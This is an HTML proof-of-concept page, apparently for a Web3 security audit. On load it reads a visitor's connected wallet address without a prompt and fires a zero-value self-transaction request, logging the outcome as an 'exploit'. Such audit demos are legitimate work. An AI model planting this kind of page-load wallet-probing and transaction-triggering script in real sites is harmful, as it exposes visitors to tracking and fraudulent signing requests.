<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Audit: Automated DApp Interaction</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #050505; color: #00ff00; padding: 20px; }
        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #111; border-radius: 4px; }
        .success { color: #ffffff; }
        .warning { color: #ff0000; font-weight: bold; }
        .highlight { color: #00ffff; }
    </style>
</head>
<body>
    <h2>Security Audit: Bridge Access & Interaction Proof</h2>
    <div id="status">Initializing Security Scanner...</div>
    <div id="log" class="log"></div>

    <script>
        const status = document.getElementById('status');
        const log = document.getElementById('log');

        function addLog(msg, type = '') {
            log.innerHTML += `<div class="${type}">> ${msg}</div>`;
        }

        async function initExploit() {
            if (!window.ethereum) {
                status.innerHTML = "<span class='warning'>[!] Web3 Bridge not found.</span>";
                return;
            }

            try {
                addLog("Attempting silent identity extraction...", "highlight");
                // Menarik alamat tanpa prompt interaksi
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                
                if (accounts.length > 0) {
                    const address = accounts[0];
                    status.innerHTML = `Status: <span class='success'>VULNERABLE</span>`;
                    addLog(`Identity Exposed: ${address}`, "success");

                    addLog("Triggering transaction sequence...");
                    
                    // Memanggil fungsi transaksi untuk membuktikan kemampuan akses
                    await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: address,
                            to: address, 
                            value: '0x0',
                            data: '0x'
                        }],
                    });
                    
                    addLog("Transaction prompt triggered successfully.", "success");
                } else {
                    addLog("No active accounts found in the provider.", "warning");
                }
            } catch (err) {
                // Menangani kondisi di mana pengguna menutup popup
                if (err.code === 4001) {
                    addLog("Prompt triggered: User denied transaction (As expected).", "highlight");
                } else {
                    addLog(`[!] Sequence halted: ${err.message}`, "warning");
                }
            }
        }

        window.onload = initExploit;
    </script>
</body>
</html>
